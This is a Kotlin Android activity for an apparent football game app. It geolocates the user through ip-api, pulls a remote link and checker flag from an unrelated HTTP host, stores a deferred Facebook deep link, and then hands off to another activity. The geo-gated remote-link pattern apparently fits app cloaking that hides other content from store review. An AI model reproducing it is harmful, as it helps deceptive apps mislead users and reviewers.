package com.gamegou.footbally

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.facebook.applinks.AppLinkData
import com.gamegou.footbally.ApppliacttionClass.Companion.countryCode
import com.gamegou.footbally.ApppliacttionClass.Companion.geo
import com.gamegou.footbally.databinding.ActivityMainBinding
import com.orhanobut.hawk.Hawk
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    private lateinit var bindMainAct: ActivityMainBinding


    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        bindMainAct = ActivityMainBinding.inflate(layoutInflater)
        setContentView(bindMainAct.root)

        deePP(this)

        val executorService = Executors.newSingleThreadScheduledExecutor()
        var countCo: String? = Hawk.get(countryCode, null)
        var ge: String? = Hawk.get(geo, null)
        executorService.scheduleAtFixedRate({
            if (countCo != null && ge != null) {
                executorService.shutdown()
                intMain()
            } else {
                countCo = Hawk.get(countryCode)
                ge = Hawk.get(geo)
            }
        }, 0, 1, TimeUnit.SECONDS)

        GlobalScope.launch(Dispatchers.IO) {
            jobMain
        }
    }


    private suspend fun getDataDev() {

        val retroBuildTwo = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://velourpanther.live/")
            .build()
            .create(ServiceApi::class.java)
        val linkView = retroBuildTwo.getDataDev().body()?.view.toString()
        val appsChecker = retroBuildTwo.getDataDev().body()?.appsChecker.toString()
        val retroData = retroBuildTwo.getDataDev().body()?.geo.toString()


        Hawk.put(ApppliacttionClass.link, linkView)
        Hawk.put(ApppliacttionClass.appsCheck, appsChecker)
        Hawk.put(geo, retroData)

        Log.d("Data from Devil", linkView)
        Log.d("Data from Devil", appsChecker)
        Log.d("Data from Devil", retroData)

    }

    private suspend fun getData() {
        val retrofitBuilder = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(ServiceApi::class.java)
        val retData = retrofitBuilder.getData().body()?.countryCode
        Log.d("Data from API", retData.toString())

        Hawk.put(countryCode, retData)
    }

    private val jobMain: Job = GlobalScope.launch(Dispatchers.IO) {
        getData()
        getDataDev()
    }

    private fun intMain() {
        val intent = Intent(this@MainActivity, AdddaaadddActivity::class.java)
        startActivity(intent)
        finish()
    }

    fun deePP(context: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val params = appLinkData.targetUri.host.toString()
                Hawk.put(ApppliacttionClass.DEEPL, params)
            }
            if (appLinkData == null) {
            }
        }
    }
}